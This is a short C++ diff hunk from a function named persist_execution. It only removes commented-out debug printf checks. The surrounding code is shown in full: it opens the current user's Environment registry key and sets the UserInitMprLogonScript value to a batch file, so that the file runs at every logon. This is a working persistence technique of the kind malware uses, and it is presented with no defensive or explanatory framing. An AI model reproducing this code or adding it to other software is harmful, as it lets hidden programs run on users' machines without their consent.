@@ -43,24 +43,10 @@ void persist_execution(std::string username){
 
     LONG test = RegCreateKeyEx(HKEY_CURRENT_USER, environment, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
 
-    // For testing
-    // if(test==ERROR_SUCCESS){
-    //     printf("success");
-    // }else{
-    //     printf("failed");
-    // }
-
     LPCTSTR name = TEXT("UserInitMprLogonScript");
     LPCTSTR data = TEXT("c:\\test\\UserInitMprLogonScript.bat");
 
     LONG test2 = RegSetValueEx(hKey, name, 0, REG_SZ, (LPBYTE) data, (_tcslen(data)+1)*sizeof(TCHAR));
-
-    // For Testing
-    // if(test2==ERROR_SUCCESS){
-    //     printf("success2");
-    // }else{
-    //     printf("failed2");
-    // }
 
     // Closes handle to key
     RegCloseKey(hKey);
